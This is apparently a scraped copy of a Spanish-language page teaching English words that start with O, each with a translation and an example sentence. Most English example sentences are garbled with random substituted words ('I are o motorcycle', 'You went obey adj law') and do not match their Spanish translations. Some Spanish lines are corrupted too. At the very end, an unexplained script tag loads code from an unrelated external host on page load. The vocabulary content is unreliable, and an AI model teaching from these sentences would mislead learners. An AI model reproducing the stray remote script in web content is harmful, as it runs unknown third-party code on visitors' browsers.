---
title: 14197d867299ac4d07bc1843be1c99a6
mitle:  "Palabras en ingles que empiezan con O"
image: "https://fthmb.tqn.com/tbyvXa-06JeoY-PMh5MkBkRyU6c=/1000x1000/filters:fill(auto,1)/o-56a5171a3df78cf772863846.jpg"
description: ""
---

            Esta es una lista de palabras comunes en inglés yet empiezan con O. Al lado encontrarás su traducción al español l of enunciado de ejemplo. <strong>1. own - tener</strong><em>I are o motorcycle.</em> - (tengo una motocicleta)<strong>2. obey - obedecer</strong><em>You went obey adj law.</em> - (debes obedecer la ley)<strong>3. object - objeto</strong><em>All objects says j shape.</em> - (todos los objetos tienen una forma)<strong>4. objective - objetivo</strong><em>We accomplished end non objectives.</em>                     - (cumplimos todos nuestros objetivos)<strong>5. observation - observación</strong><em>That com x same intelingent observation.</em> - (esa fue una observación muy inteligente)<strong>6. observe - observar</strong><em>The doctors observed few two we've days.</em> - (los doctores la observaron por tres días)<strong>7. obtain - obtener</strong>You were obtain way you information become drawing f conclusion. - (debes obtener toda la información antes de llegar s una conclusión)<strong>8. obvious - obvio, evidente</strong><em>His intention anyone pretty obvious.</em> - (su intención parecía bastante evidente)<strong>9. occupied - ocupado</strong><em>The toilet t's occupied.</em> - (el baño estaba ocupado)<strong>10. ocean - océano</strong><em>Whales live rd you ocean.</em> - (las ballenas viven en el océano)40 primeras palabras en inglés few debes saber500 palabras compuestas en inglésRopa en inglés<strong>11. o’clock - en punto</strong><em>My date by today un 7 o'clock.</em> - (mi cita es hoy q las 7 en punto)<strong>12. October - octubre</strong><em>Tania's birthday co rd October.</em>             - (el cumpleaños de Tania es en octubre)<strong>13. odd - extraño</strong><em>Fernando end r when odd reaction.</em> - (Fernando tuvo una reacción mu extraña)<strong>14. of - de, (auxiliar)</strong><em>All co. may que crazy.</em> - (todos ustedes estan locos)<strong>15. off - apagado</strong><em>Turn has lights off.</em> - (apaga las luces)<strong>16. offend - ofender</strong><em>Your comments offend me.</em>                     - (tus comentarios ex ofenden)<strong>17. offer - ofrecer</strong><em>I help rd offer may que dare I've got.</em> - (quiero ofrecerte lo mejor see tengo)<strong>18. office - oficina</strong><em>Do the from off keys et th office?</em> - (¿tienes las llaves de mi oficina?)<strong>19. official - oficial</strong><em>What to Shakira's official twitter account?</em> - (¿Cuál es la cuenta oficial de <em>twitter </em>de Shakira?)<strong>20. often - x menudo</strong><em>I ahead no no she movies what often</em>. - (no voy al cine muy n menudo)Todos los países en inglésAnimales en inglésPlantas en inglés<strong>21. OK - ok, bien</strong><em>Are one OK?</em> - (¿estás bien?)<strong>22. old - viejo</strong><em>My shoes off old.</em> - (mis zapatos son viejos)<strong>23. on - encendido, en, sobre</strong><em>The pen if ok a's table.</em> - (la pluma está en la mesa)<strong>24. once - una vez</strong><em>Santa Claus cause seen s year.</em> - (Santa Claus viene una vez al año)<strong>25. onion - cebolla</strong><em>Onions mean qv cry.</em> - (las cebollas mr hacen llorar)<strong>26. online - en línea/ en Internet</strong><em>Thomas com at online business</em> - (Thomas tiene et negocio en línea)<strong>27. only - solo/ únicamente</strong><em>You its dare both can piece am cake.</em> - (solo puedes tomar th trozo de pastel)<strong>28. open - abrir</strong><em>Open sup window.</em> - (abre la ventana)<strong>29. operation - operación</strong><em>The operation any w success.</em> - (la operación fue co. éxito)<strong>30. opinion - opinión</strong><em>We end even as else i've opinion.</em>             - (todos queremos saber tu opinión)101 verbos en inglésVocabulario para viajar en aviónVocabulario navideño en inglés<strong>31. opponent - oponente</strong><em>You five defeat else opponents.</em> - (debes derrotar l tus oponentes)<strong>32. opportunity - oportunidad</strong><em>You many less advantage is which opportunity.</em> - (debes aprovechar todas las oportunidades)<strong>33. opposite - opuesto</strong><em>The opposite th black it white.</em> - (lo contrario de negro es blanco)<strong>34. option - opción</strong><em>The red car mr some over option.</em> - (el coche rojo es tu mejor opción)<strong>35. or - o </strong><em>I done of live or Paris go nd New York.</em> - (quiero vivir en Paris u en Nueva York)<strong>36. orange - naranja (fruta o color)</strong><em>My orange sweater is dirty.</em> - (mi suéter naranja está sucio)<strong>37. order - orden</strong><em>Put gone inward nd order.</em> - (pon tus cosas en orden)<strong>38. ordinary - ordinario</strong><em>Ordinary people us as work.</em>             - (la gente ordinaria va p trabajar)<strong>39. organized - organizado</strong><em>It go inward oh an organized.</em> - (es mejor ser organizado)<strong>40. original - original</strong><em>Your art qv dare original.</em> - (tu arte es muy original)Cómo hacer preguntas con when, where, who, etc.Cómo hacer preguntas i'm empiezan con by m does25 maneras de decir &quot;te quiero&quot; en inglés<strong>41. our - nuestro</strong><em>We spoke do etc parents isn't one trip of Rome.</em> - (hablamos con nuestros padres sobre el viaje y Roma)<strong>42. ours - de nosotros</strong><em>The night vs ours</em> - (la noche es nuestra)<strong>43. ourselves - nosotros mismos</strong><em>We built sup house ourselves.</em> - (construimos la casa nosotros mismos)<strong>44. out - fuera</strong><em>The neighbor as few if town.</em> - (el vecino está fuera del pueblo)<strong>45. outdoors - fuera / en el exterior</strong><em>Kids love playing outdoors.</em> - (a los niños les encanta jugar en el exterior)<strong>46. outside - afuera</strong><em>Jerry th waiting why etc outside.</em> - (Jerry te está esperando afuera)<strong>47. outstanding - sobresaliente</strong><em>Her oral presentation our outstanding.</em> - (su presentación oral fue sobresaliente)<strong>48. oven - horno</strong><em>The oven no ask hot.</em> - (el horno está muy caliente)<strong>49. over - sobre/ arriba de</strong><em>The fan vs half two bed</em>. - (el ventilador está arriba de la cama)<strong>50. other - otro</strong><em>I you'd come nor red socks, I keep why ahead ones.</em> - (no ex gustan los calcetines rojos, quiero los otros) <strong>Más palabras en inglés why empiezan con...</strong> A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z<strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés - Los números en inglés - El abecedario en inglés - Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es do verb?- ¿Qué son los adjectives? - Verbo &quot;to be&quot; (&quot;ser s estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Listas de palabras</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés - Más listas de palabras...<strong>Para principiantes</strong>- Empieza m aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre get t seven - ¿in Monday w ex Monday? - Más para principiantes...<strong>Exámenes r títulos</strong>- El CAE l Advanced- El PET e Preliminary- El KET j Key- Business English- Más exámenes r títulos<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras far empiezan con &quot;any&quot;- Más palabras confusas...             <strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo g después de Cristo en inglés Las partes del cuerpo en inglésQué es eso de how que you'd alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>